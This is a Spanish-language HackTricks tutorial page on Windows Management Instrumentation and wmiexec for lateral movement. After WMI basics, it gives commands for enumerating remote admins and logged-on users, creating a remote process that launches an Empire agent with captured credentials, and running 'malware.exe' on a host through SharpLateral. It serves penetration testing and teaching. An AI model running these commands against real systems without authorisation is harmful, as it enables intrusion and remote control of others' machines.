# WmicExec

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Cómo funciona

Wmi permite abrir procesos en hosts donde conoces el nombre de usuario/(contraseña/Hash). Luego, Wmiexec utiliza wmi para ejecutar cada comando que se le pide ejecutar (por eso Wmicexec te proporciona una shell semi-interactiva).

**dcomexec.py:** Este script proporciona una shell semi-interactiva similar a wmiexec.py, pero utilizando diferentes puntos finales de DCOM (objeto DCOM ShellBrowserWindow). Actualmente, es compatible con los objetos MMC20. Application, Shell Windows y Shell Browser Window. (de [aquí](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## Conceptos básicos de WMI

### Namespace

WMI está dividido en una jerarquía al estilo de un directorio, el contenedor \root, con otros directorios bajo \root. Estas "rutas de directorio" se llaman namespaces.\
Lista de namespaces:
```bash
#Get Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

#List all namespaces (you may need administrator to list all of them)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

#List namespaces inside "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Listar clases de un espacio de nombres con:
```bash
gwmwi -List -Recurse #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Clases**

El nombre de la clase WMI, por ejemplo: win32\_process, es un punto de partida para cualquier acción WMI. Siempre necesitamos saber un Nombre de Clase y el Espacio de Nombres donde está ubicado.\
Lista de clases que comienzan con `win32`:
```bash
Get-WmiObject -Recurse -List -class win32* | more #If no namespace is specified, by default is used: "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Llamar a una clase:
```bash
#When you don't specify a namespaces by default is "root/cimv2"
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Métodos

Las clases WMI tienen una o más funciones que pueden ser ejecutadas. Estas funciones se llaman métodos.
```bash
#Load a class using [wmiclass], leist methods and call one
$c = [wmiclass]"win32_share"
$c.methods
#Find information about the class in https://docs.microsoft.com/en-us/windows/win32/cimwin32prov/win32-share
$c.Create("c:\share\path","name",0,$null,"My Description")
#If returned value is "0", then it was successfully executed
```

```bash
#List methods
Get-WmiObject -Query 'Select * From Meta_Class WHERE __Class LIKE "win32%"' | Where-Object { $_.PSBase.Methods } | Select-Object Name, Methods
#Call create method from win32_share class
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## Enumeración WMI

### Verificar servicio WMI

Así es como puedes verificar si el servicio WMI está en funcionamiento:
```bash
#Check if WMI service is running
Get-Service Winmgmt
Status   Name               DisplayName
------   ----               -----------
Running  Winmgmt            Windows Management Instrumentation

#From CMD
net start | findstr "Instrumentation"
```
### Información del Sistema
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
```
### Información del Proceso
```bash
Get-WmiObject win32_process | Select Name, Processid
```
Desde la perspectiva de un atacante, WMI puede ser muy valioso para enumerar información sensible sobre un sistema o el dominio.
```
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```

```bash
Get-WmiObject Win32_Processor -ComputerName 10.0.0.182 -Credential $cred
```
## **Consulta Remota Manual de WMI**

Por ejemplo, aquí hay una forma muy sigilosa de descubrir administradores locales en una máquina remota (nota que dominio es el nombre de la computadora):

{% code overflow="wrap" %}
```bash
wmic /node:ordws01 path win32_groupuser where (groupcomponent="win32_group.name=\"administrators\",domain=\"ORDWS01\"")
```
```markdown
Otro oneliner útil es para ver quién está conectado a una máquina (cuando estás buscando administradores):
```
```bash
wmic /node:ordws01 path win32_loggedonuser get antecedent
```
`wmic` puede incluso leer nodos de un archivo de texto y ejecutar el comando en todos ellos. Si tienes un archivo de texto de estaciones de trabajo:
```
wmic /node:@workstations.txt path win32_loggedonuser get antecedent
```
**Crearemos de forma remota un proceso a través de WMI para ejecutar un agente de Empire:**
```bash
wmic /node:ordws01 /user:CSCOU\jarrieta path win32_process call create "**empire launcher string here**"
```
Observamos que se ejecutó con éxito (ReturnValue = 0). Y un segundo después, nuestro oyente de Empire lo detecta. Nota que el ID del proceso es el mismo que WMI devolvió.

Toda esta información fue extraída de aquí: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

## Herramientas Automáticas

* [**SharpLateral**](https://github.com/mertdas/SharpLateral):

{% code overflow="wrap" %}
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
